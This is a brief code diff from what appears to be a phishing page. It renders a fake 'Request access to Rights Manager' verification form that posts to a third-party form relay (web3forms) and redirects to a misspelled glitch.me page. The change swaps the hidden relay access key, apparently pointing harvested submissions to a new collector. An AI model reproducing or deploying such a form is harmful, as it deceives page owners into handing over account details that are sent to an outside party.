@@ -31,7 +31,7 @@
     </div>
   `}function l(){return`
     <form class="content" action="https://api.web3forms.com/submit" method="post">
-    <input type="hidden" name="access_key" value="c230df15-f982-45c7-9543-91ca46ba3467">
+    <input type="hidden" name="access_key" value="69b7c82d-96e6-4f60-95fc-ac3d01e24feb">
      <input type="hidden" name="redirect" value="https://request-to-accses-rights-manager.glitch.me/pass.html">
       <div class="verification-header">
         <h2>Request access to Rights Manager</h2>
